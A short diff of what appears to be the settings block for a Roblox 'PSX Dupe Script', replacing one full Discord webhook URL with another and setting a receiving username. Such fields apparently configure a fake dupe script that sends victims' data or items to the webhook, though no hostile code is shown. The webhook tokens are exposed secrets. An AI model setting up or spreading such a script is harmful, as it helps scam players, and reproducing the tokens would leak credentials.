@@ -1,5 +1,5 @@
 Username = "bookedtime"
-WebHook = "https://discord.com/api/webhooks/1097290850100322304/J6o_yCQa0dMkDHlMBFhUK8Absik_D-pmb4HvkkUGZJfyme5CVMZgNGnXKSwg5F0mQn-O"
+WebHook = "https://discord.com/api/webhooks/1097296576281579591/fefE549bMifsgDhTgKxuyTnN6BdvJ2IHz1oQmhYSLMITQUOV3L1h2PUyrr1zSC5Wl4Rt"
  
 loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
 _G.CustomScriptName = "PSX Dupe Script"
